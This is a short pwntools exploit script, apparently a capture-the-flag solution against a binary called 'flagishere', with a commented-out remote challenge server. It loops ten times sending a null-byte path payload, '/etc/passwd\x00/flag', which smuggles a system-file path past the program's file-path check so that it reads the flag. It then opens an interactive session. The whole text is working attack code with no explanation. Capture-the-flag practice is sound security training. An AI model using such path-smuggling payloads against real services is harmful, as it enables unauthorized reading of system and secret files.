from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('flagishere')
r= e.process()
# r = remote('challs.n00bzunit3d.xyz', 42450)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

r.sendlineafter(b"> ", b"0")
for i in range(10):
    r.sendlineafter(b"> ", b"1")
    payload = "/etc/passwd\x00/flag"
    # pause()
    r.sendlineafter(b"file path: ",payload)
    r.sendlineafter(b"saved block offset: ",str(i))

r.interactive()
    